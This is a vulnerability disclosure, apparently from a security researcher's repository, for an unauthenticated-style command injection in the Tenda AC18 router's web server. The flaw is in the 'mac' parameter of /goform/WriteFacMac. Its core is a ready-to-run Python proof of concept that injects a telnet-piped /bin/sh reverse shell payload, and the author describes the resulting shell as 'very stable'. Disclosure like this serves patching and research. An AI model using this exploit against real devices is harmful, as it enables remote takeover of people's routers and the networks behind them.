Vendor:Tenda https://www.tenda.com.cn/default.html
product:AC18
version:V15.03.05.19 and  V15.03.05.05
type:Arbitrary Remote Command Execution
author:WuShaoZhen
institution:WuShaoZhen@Xiangtan University

## Vulnerability description:
I found an Arbitrary Command Execution vulnerability in the router's web server-- **/bin/httpd** of squashfs filesystem. While processing the **mac** parameters for a post request(when an attacker accesses ip/goform/WriteFacMac), the value is directly passed to doSystem, which causes a RCE. The details are shown below: 

![rce1.1.png](https://github.com/wshidamowang/Router/blob/main/Tenda/AC18/AC18_images/rce1.1.png)


![rce1.2.png](https://github.com/wshidamowang/Router/blob/main/Tenda/AC18/AC18_images/rce1.2.png)


Close the previous command with a semicolon and then cause an Arbitrary Remote Command Execution
## Poc:
```python2
import requests
from pwn import*

ip = "192.168.211.128" #You Tenda AC18 Router IP
url = "http://" + ip + "/goform/WriteFacMac"
print(url)


#payload = ";cmd"
#payload = ";telnet ip port1 | /bin/sh | telnet ip port2"
payload = ";telnet 127.0.0.1:1111 | /bin/sh | telnet 127.0.0.1:2222"


cookie = {"Cookie":"password=12345"}
data = {"mac": payload}
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
print("HackAttackSuccess!")
```
Use the above POC to play shell through telnet You can get a very stable shell
![rce1.3.png](https://github.com/wshidamowang/Router/blob/main/Tenda/AC18/AC18_images/rce1.3.png)
![rce1.4.png](https://github.com/wshidamowang/Router/blob/main/Tenda/AC18/AC18_images/rce1.4%20.png)
